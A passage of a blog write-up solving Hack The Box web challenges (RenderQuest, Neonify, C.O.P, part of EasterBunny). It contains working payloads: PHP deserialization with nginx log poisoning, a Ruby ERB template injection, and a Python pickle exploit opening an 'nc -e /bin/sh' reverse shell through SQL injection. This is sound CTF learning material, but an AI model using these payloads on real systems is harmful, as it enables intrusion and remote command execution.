+<figure class="highlight applescript"><table><tbody><tr><td class="code"><pre><span class="line">- `O:<span class="number">9</span>:<span class="string">"PageModel"</span>:<span class="number">1</span>`:</span><br><span class="line">    - `O`: Denotes an object.</span><br><span class="line">    - `<span class="number">9</span>`: The <span class="built_in">length</span> <span class="keyword">of</span> <span class="keyword">the</span> serialized <span class="built_in">string</span>.</span><br><span class="line">    - `<span class="string">"PageModel"</span>`: Name <span class="keyword">of</span> <span class="keyword">the</span> <span class="built_in">class</span> (<span class="keyword">in</span> this case, <span class="string">"PageModel"</span>).</span><br><span class="line">    - `<span class="number">1</span>`: Indicates there <span class="keyword">is</span> <span class="number">1</span> <span class="keyword">property</span> <span class="keyword">in</span> <span class="keyword">the</span> serialized object.</span><br><span class="line">- `{s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">15</span>:<span class="string">"/www/index.html"</span>;}`:</span><br><span class="line">    </span><br><span class="line">    - `s:<span class="number">4</span>:<span class="string">"file"</span>;`: Represents a <span class="built_in">string</span> <span class="keyword">with</span> a <span class="built_in">length</span> <span class="keyword">of</span> <span class="number">4</span> <span class="built_in">characters</span> <span class="keyword">for</span> <span class="keyword">the</span> <span class="keyword">property</span> <span class="built_in">name</span> <span class="string">"file"</span>.</span><br><span class="line">    - `s:<span class="number">15</span>:<span class="string">"/www/index.html"</span>;`: Represents a <span class="built_in">string</span> <span class="keyword">with</span> a <span class="built_in">length</span> <span class="keyword">of</span> <span class="number">15</span> <span class="built_in">characters</span> <span class="keyword">for</span> <span class="keyword">the</span> value <span class="string">"/www/index.html"</span>.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>The only field we have to modify is the <code>s:15:"/www/index.html"</code>.</p>
+<p>Then we can have a control of what is being render in the page.</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(ikonw㉿Xing)-[~/Desktop/htb_challenge/RenderQuest]</span><br><span class="line">└─$ <span class="built_in">echo</span> <span class="string">'O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}'</span> | <span class="built_in">base64</span></span><br><span class="line">Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30K</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231231205627619.png" class="lazyload"></p>
+<p>After some trial and error, I dont seem to show the <code>/flag.txt</code>. Checking the docker it seems the filename is being by randomly renamed in entrypoint.sh</p>
+<figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">!/bin/ash</span><br><span class="line"></span><br><span class="line"><span class="comment"># Secure entrypoint</span></span><br><span class="line"><span class="built_in">chmod</span> 600 /entrypoint.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate random flag filename</span></span><br><span class="line"><span class="built_in">mv</span> /flag /flag_`<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">'a-zA-Z0-9'</span> | <span class="built_in">fold</span> -w 5 | <span class="built_in">head</span> -n 1`</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> <span class="string">"<span class="variable">$@</span>"</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>we have no way to extract the file without knowing the name.</p>
+<p>Since we are able to have local file inclusion, we can always perform <a target="_blank" rel="noopener" href="https://systemweakness.com/log-poisoning-to-remote-code-execution-lfi-curl-7c49be11956">log poisoning</a>.</p>
+<p>Review the Dockerfile, the webserver is using nginx, which means we can find the access.log file located at <code>/var/log/nginx/access.log</code></p>
+<p>Changed the User-Agent to executes PHP codes </p>
+<p>Below is the full script to extract the flag name and the content using regex.</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">"http://167.99.85.216:30412/"</span></span><br><span class="line"></span><br><span class="line">cookie = <span class="string">b'O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}'</span></span><br><span class="line">cookie = base64.b64encode(cookie)</span><br><span class="line">header =  {<span class="string">"PHPSESSID"</span>: cookie.decode()}</span><br><span class="line"><span class="built_in">print</span>(cookie)</span><br><span class="line">headers = {<span class="string">"User-Agent"</span>: <span class="string">"&lt;?php system('ls -la /')?&gt;"</span>}</span><br><span class="line">r = requests.get(url,cookies=header, headers=headers)</span><br><span class="line">flag = re.search(<span class="string">r'\bflag_\w+\b'</span>, r.text, flags=re.IGNORECASE)</span><br><span class="line">flag = flag.group()</span><br><span class="line"></span><br><span class="line">headers = {<span class="string">"User-Agent"</span>: <span class="string">f"&lt;?php system('cat /<span class="subst">{flag}</span>')?&gt;"</span>}</span><br><span class="line"><span class="built_in">print</span>(headers)</span><br><span class="line">r = requests.get(url,cookies=header, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20231231210821028.png" class="lazyload"></p>
+<h1 id="Neonify-Easy"><a href="#Neonify-Easy" class="headerlink" title="Neonify - Easy"></a>Neonify - Easy</h1><blockquote>
+<p>It’s time for a shiny new reveal for the first-ever text neonifier. Come test out our brand new website and make any text glow like a lo-fi neon tube!</p>
+</blockquote>
+<p>In <code>neon.rb</code> file indicate POST method route seems using ERB template engine to render user inputs.</p>
+<figure class="highlight ruby"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NeonControllers</span> &lt; <span class="title class_ inherited__">Sinatra::Base</span></span><br><span class="line"></span><br><span class="line">  configure <span class="keyword">do</span></span><br><span class="line">    set <span class="symbol">:views</span>, <span class="string">"app/views"</span></span><br><span class="line">    set <span class="symbol">:public_dir</span>, <span class="string">"public"</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  get <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">    <span class="variable">@neon</span> = <span class="string">"Glow With The Flow"</span></span><br><span class="line">    erb <span class="symbol">:<span class="string">'index'</span></span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  post <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> params[<span class="symbol">:neon</span>] =~ <span class="regexp">/^[0-9a-z ]+$/i</span></span><br><span class="line">      <span class="variable">@neon</span> = <span class="variable constant_">ERB</span>.new(params[<span class="symbol">:neon</span>]).result(binding)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="variable">@neon</span> = <span class="string">"Malicious Input Detected"</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    erb <span class="symbol">:<span class="string">'index'</span></span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>The regex match the start and the end of the line, and matches alphanumeric and whitespace only.</p>
+<p>With some research that Ruby regex has some form of <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/577653/difference-between-a-z-and-in-ruby-regular-expressions/577675#577675">insecure use of Regular expressions</a>.</p>
+<p>According to hacktrick we can supply the following payload for reading files</p>
+<figure class="highlight delphi"><table><tbody><tr><td class="code"><pre><span class="line">&lt;%= <span class="keyword">File</span>.open(<span class="string">'/etc/passwd'</span>).<span class="keyword">read</span> %&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>In order to abuse the insecure regex in ruby, burp request seems have problem with the <code>\n</code>.</p>
+<p>We can just firefox to modify the request to manually append a new line just like this in network tab</p>
+<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20240101233647948.png" class="lazyload"></p>
+<p>However I did receive a 400 error request.</p>
+<p>After some research, I perform a <a target="_blank" rel="noopener" href="https://meyerweb.com/eric/tools/dencoder/">URL encode</a> seems to get the things right</p>
+<figure class="highlight llvm"><table><tbody><tr><td class="code"><pre><span class="line">neon<span class="operator">=</span>a</span><br><span class="line"><span class="variable">%3</span>C<span class="variable">%25</span><span class="variable">%3</span>D<span class="variable">%20</span>File.open(<span class="variable">%27</span><span class="variable">%2</span>Fetc<span class="variable">%2</span>Fpasswd<span class="variable">%27</span>).read<span class="variable">%20</span><span class="variable">%25</span><span class="variable">%3</span>E</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20240101233841328.png" class="lazyload"></p>
+<p>Yeah, manage to read the file, now we can just change <code>/etc/passwd</code> to <code>/flag.txt</code> and we got the flag.</p>
+<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20240101234044647.png" class="lazyload"></p>
+<h1 id="C-O-P-Easy"><a href="#C-O-P-Easy" class="headerlink" title="C.O.P - Easy"></a>C.O.P - Easy</h1><blockquote>
+<p>The C.O.P (Cult of Pickles) have started up a new web store to sell their merch. We believe that the funds are being used to carry out illicit pickle-based propaganda operations! Investigate the site and try and find a way into their operation!</p>
+</blockquote>
+<p>Perform a blackbox approach first, found the site shows the ID of the item. </p>
+<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20240102214618769.png" class="lazyload"></p>
+<p>Found the item to be listed on the URL </p>
+<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://localhost:<span class="number">1337</span>/view/<span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>Tried with sqlmap to identify any possible SQLi.</p>
+<p>However there’s some problem with the URL, as it dont have paramter to inject, need to manually added a <code>*</code> in burp request and save it </p>
+<figure class="highlight http"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/view/1*</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:1337</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight asciidoc"><table><tbody><tr><td class="code"><pre><span class="line">sqlmap -r requests.txt --dump-all</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="code">+----+</span>----------------------------------------------------------------------------------</span><br><span class="line"><span class="section">| id | data                                                                                                                                                                                                                                                         | created_at          |</span></span><br><span class="line"><span class="section">+----+----------------------------------------------------------------------------------</span></span><br><span class="line">| 1  | gASVoAAAAAAAAACMFGFwcGxpY2F0aW9uLmRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwEbmFtZZSMDFBpY2tsZSBTaGlydJSMC2Rlc2NyaXB0aW9ulIwZR2V0IG91ciBuZXcgcGlja2xlIHNoaXJ0IZSMBWltYWdllIwfL3N0YXRpYy9pbWFnZXMvcGlja2xlX3NoaXJ0LmpwZ5SMBXByaWNllIwCMjOUdWIu                         | 2024-01-02 13:44:09 |</span><br><span class="line">| 2  | gASVrAAAAAAAAACMFGFwcGxpY2F0aW9uLmRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwEbmFtZZSMDlBpY2tsZSBTaGlydCAylIwLZGVzY3JpcHRpb26UjCJHZXQgb3VyIChzZWNvbmQpIG5ldyBwaWNrbGUgc2hpcnQhlIwFaW1hZ2WUjCAvc3RhdGljL2ltYWdlcy9waWNrbGVfc2hpcnQyLmpwZ5SMBXByaWNllIwCMjeUdWIu         | 2024-01-02 13:44:09 |</span><br><span class="line">| 3  | gASVnQAAAAAAAACMFGFwcGxpY2F0aW9uLmRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwEbmFtZZSMD0RpbGwgUGlja2xlIEphcpSMC2Rlc2NyaXB0aW9ulIwXTGl0ZXJhbGx5IGp1c3QgYSBwaWNrbGWUjAVpbWFnZZSMGS9zdGF0aWMvaW1hZ2VzL3BpY2tsZS5qcGeUjAVwcmljZZSMBDEzMzeUdWIu                             | 2024-01-02 13:44:09 |</span><br><span class="line"><span class="section">| 4  | gASVsgAAAAAAAACMFGFwcGxpY2F0aW9uLmRhdGFiYXNllIwESXRlbZSTlCmBlH2UKIwEbmFtZZSMD0JyYW5zdG9uIFBpY2tsZZSMC2Rlc2NyaXB0aW9ulIwjRG9lcyB0aGlzIGV2ZW4gZml0IG9uIG91ciBzdG9yZT8hPyGUjAVpbWFnZZSMIi9zdGF0aWMvaW1hZ2VzL2JyYW5zdG9uX3BpY2tsZS5qcGeUjAVwcmljZZSMBDcuMzCUdWIu | 2024-01-02 13:44:09 |</span></span><br><span class="line"><span class="section">+----+----------------------------------------------------------------------------------</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>Found some encoded value, decode with base64 seems like some seralization.</p>
+<p>Proceed with source code analysis.</p>
+<figure class="highlight angelscript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="symbol">shop</span>(<span class="symbol">object</span>):</span><br><span class="line">    @<span class="symbol">staticmethod</span></span><br><span class="line">    <span class="symbol">def</span> <span class="symbol">select_by_id</span>(<span class="symbol">product_id</span>):</span><br><span class="line">        <span class="symbol">return</span> <span class="symbol">query_db</span>(<span class="symbol">f</span>"<span class="symbol">SELECT</span> <span class="symbol">data</span> <span class="symbol">FROM</span> <span class="symbol">products</span> <span class="symbol">WHERE</span> <span class="symbol">id</span>='{product_id}<span class="string">'", one=True)</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>The parameter does not have any sanitization </p>
+<p>The application seems to serialized the item object and base64 encode and save it in database. </p>
+<figure class="highlight less"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">@app</span>.<span class="built_in">template_filter</span>(<span class="string">'pickle'</span>)</span><br><span class="line">def <span class="built_in">pickle_loads</span>(s):</span><br><span class="line">	return pickle.<span class="built_in">loads</span>(base64.<span class="built_in">b64decode</span>(s))</span><br></pre></td></tr></tbody></table></figure>
+
+<p>In <code>item.html</code> the template engine deserialize the items and render on webpage.</p>
+<figure class="highlight applescript"><table><tbody><tr><td class="code"><pre><span class="line">{% <span class="keyword">set</span> <span class="built_in">item</span> = product | pickle %}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Since it dont have any restriction, we can passed in a base64 encoded object that trigger a <code>os.system</code> command to achieve RCE.</p>
+<p>In the payload class, we use the <code>__reduce__</code> method to create and return a tuple that includes the operating system command as an argument. Then, from that payload class, we create an object, serialize and encode it. Once again, using Base64, we’ll just need the input from there.</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'nc 172.17.0.1 4444 -e /bin/sh'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exploit</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> os.system, (payload,)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="built_in">print</span>(base64.urlsafe_b64encode(pickle.dumps(exploit())).decode(<span class="string">'ascii'</span>))</span><br></pre></td></tr></tbody></table></figure>
+
+<p>From here we got the base64 encoded string</p>
+<figure class="highlight abnf"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">gASVOAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB1uYyAxNzIuMTcuMC4xIDQ0NDQgLWUgL2Jpbi9zaJSFlFKULg</span><span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>Now we have to construct the parameter that abuse the SQLI to deserizlise malicious object.<br>`</p>
+<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://localhost:<span class="number">1337</span>/view/'%<span class="number">20</span>UNION%<span class="number">20</span>SELECT%<span class="number">20</span>'gASVOAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB1uYyAxNzIuMTcuMC4xIDQ0NDQgLWUgL2Jpbi9zaJSFlFKULg==</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/images/placeholder.png" data-src="/images/HTB-Web-Challenge/image-20240102221626649.png" class="lazyload"></p>
+<h1 id="EasterBunny-Easy"><a href="#EasterBunny-Easy" class="headerlink" title="EasterBunny - Easy"></a>EasterBunny - Easy</h1><blockquote>
+<p>It’s that time of the year again! Write a letter to the Easter bunny and make your wish come true! But be careful what you wish for because the Easter bunny’s helpers are watching!</p>
+</blockquote>
+<p>Break down the <code>routes.js</code></p>
+<figure class="highlight js"><table><tbody><tr><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">"/"</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">"index.html"</span>, {</span><br><span class="line">        <span class="attr">cdn</span>: <span class="string">`<span class="subst">${req.protocol}</span>://<span class="subst">${req.hostname}</span>:<span class="subst">${req.headers[<span class="string">"x-forwarded-port"</span>] ?? <span class="number">80</span>}</span>/static/`</span>,</span><br><span class="line">    });</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure>
+
+<p>The <code>/</code> path define that, it will render the <code>index.html</code> and pass the CDN url to it.</p>
+<p>To be more detailed as not familiar with node js syntax.</p>
+<p>The <code>$$</code> operator used here is the Nullish Coalescing Operator in javascript. It returns the value if the left hand operand if it’s not <code>null</code> or <code>undefined</code>. If the left-hand side is <code>null</code> or <code>uundefined</code> it returns the right hand operand in this case is <code>80</code></p>
+<figure class="highlight js"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">cdn</span>: <span class="string">`<span class="subst">${req.protocol}</span>://<span class="subst">${req.hostname}</span>:<span class="subst">${req.headers[<span class="string">"x-forwarded-port"</span>] ?? <span class="number">80</span>}</span>/static/`</span>,</span><br></pre></td></tr></tbody></table></figure>
+
+<p>same goes to the second endpoint <code>/letter</code></p>
+<figure class="highlight js"><table><tbody><tr><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">"/letters"</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">"viewletters.html"</span>, {</span><br><span class="line">        <span class="attr">cdn</span>: <span class="string">`<span class="subst">${req.protocol}</span>://<span class="subst">${req.hostname}</span>:<span class="subst">${req.headers[<span class="string">"x-forwarded-port"</span>] ?? <span class="number">80</span>}</span>/static/`</span>,</span><br><span class="line">    });</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure>
+
+<p>third endpoint <code>/submit</code>.</p>
+<p>Its a post method, checking if parameter <code>message</code> is exist in the request body. if it does not exist or empty it will exit.</p>
+<p>Next, if the message exist, it will inject the message into database using the method <code>db.insertMessage</code>.</p>
+<p>If the message is successful insert into database, it will trigger a bot to visit the speceific URL </p>
+<figure class="highlight js"><table><tbody><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">"/submit"</span>, <span class="keyword">async</span> (req, res) =&gt; {</span><br><span class="line">    <span class="keyword">const</span> { message } = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (message) {</span><br><span class="line">        <span class="keyword">return</span> db.<span class="title function_">insertMessage</span>(message)</span><br><span class="line">            .<span class="title function_">then</span>(<span class="keyword">async</span> inserted =&gt; {</span><br><span class="line">                <span class="keyword">try</span> {</span><br><span class="line">                    botVisiting = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">await</span> <span class="title function_">visit</span>(<span class="string">`http://127.0.0.1/letters?id=<span class="subst">${inserted.lastID}</span>`</span>, authSecret);</span><br><span class="line">                    botVisiting = <span class="literal">false</span>;</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">catch</span> (e) {</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">                    botVisiting = <span class="literal">false</span>;</span><br><span class="line">                }</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">201</span>).<span class="title function_">send</span>(<span class="title function_">response</span>(inserted.<span class="property">lastID</span>));</span><br><span class="line">            })</span><br><span class="line">            .<span class="title function_">catch</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="title function_">response</span>(<span class="string">'Something went wrong!'</span>));</span><br><span class="line">            });</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">send</span>(<span class="title function_">response</span>(<span class="string">'Missing required parameters!'</span>));</span><br><span class="line">});</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+	</div>
+	
+
+	<div class="article-tags">
+		
+	</div>
+
+	<div class="article-bottom">
+		<a class="readmore" href="/1998/01/01/HTB-Web-Challenge/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+
+	
+	
+ 
+   <nav class="paginator">
+    
+        <a class="prev" href="/page/4/"> 
+            <i class="iconfont icon-left"></i>
+            Prev
+        </a>
+    
+
+   <span class="page-number"> Page <strong>5</strong>, Posts <strong>33</strong>. </span>
+
+    
+  </nav> 
+
+	
+
+    <script type="text/x-mathjax-config">
+        var post = document.getElementsByClassName("post")[0];  
+        MathJax.Hub.Config({
+            showProcessingMessages: false,
+            messageStyle: "none",    
+            tex2jax: {
+                inlineMath:  [ ["$", "$"] , ["\\(","\\)"]],
+                displayMath: [ ["$$","$$"] , ["\\[","\\]"]],
+                skipTags: ['script', 'noscript', 'style', 'textarea', 'pre','code','a'],
+            },
+            "HTML-CSS": {            
+                showMathMenu: false
+            }
+        });
+        MathJax.Hub.Queue(["Typeset",MathJax.Hub,post]);
+    </script>
+    <style>.MathJax{outline:0;}</style>
+
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.2/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+ 
+</div>
+          </div> 
+      </div>            
+    
+        <i id="toTop" class="iconfont icon-backtotop"></i>
+
+  
+    <div class="none" id="search">
+    <div class="header">
+        <input type="text" placeholder="Typing Something here." id="search-input" class="input">
+        
+        <i id="search-cancel" class="iconfont icon-cancel"></i>
+    </div>
+
+    <div id="search-result" class="result"></div>
+</div>
+     <div class="mobile-menu">      
+
+      
+      <img class="mobile-menu-icon lazyload" src="/images/placeholder.png" data-src="/images/avatar.jpg">  
+      
+
+         
+            
+
+            <a class="mobile-menu-link" href="/">Home
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/archives">Archives
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/tags">Tags
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/about">About
+            </a>
+            
+         
+                          
+
+            <a class="mobile-menu-link mobile-menu-search" href="#">Search </a>                 
+            
+         
+      
+</div>
+        
+    
+
+
+
+     
+    
+
+
+<footer class="footer">
+	<div class="inner">
+		<div class="copyright">
+			©
+			
+			2020 -
+			
+			2024
+			Ikonw
+
+			<br>
+			By <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
+		</div>
+	</div>
+</footer>   
+
+    
+<script src="/nayo.bundle.js"></script>
+           
+          
+</body></html>
